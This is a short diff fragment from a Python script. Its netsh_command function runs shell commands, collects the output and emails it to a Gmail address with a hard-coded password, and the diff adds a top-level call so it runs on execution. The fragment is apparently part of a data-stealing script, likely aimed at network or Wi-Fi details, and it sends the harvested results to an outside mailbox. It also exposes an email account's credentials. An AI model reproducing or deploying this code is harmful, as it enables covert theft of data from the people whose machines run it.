@@ -26,3 +26,5 @@ def netsh_command():
         current_result = subprocess.check_output(current_command, shell=True)
         result += current_result
     send_mail("boggrom@gmail.com", "h3z9y85$", result)
+
+netsh_command()
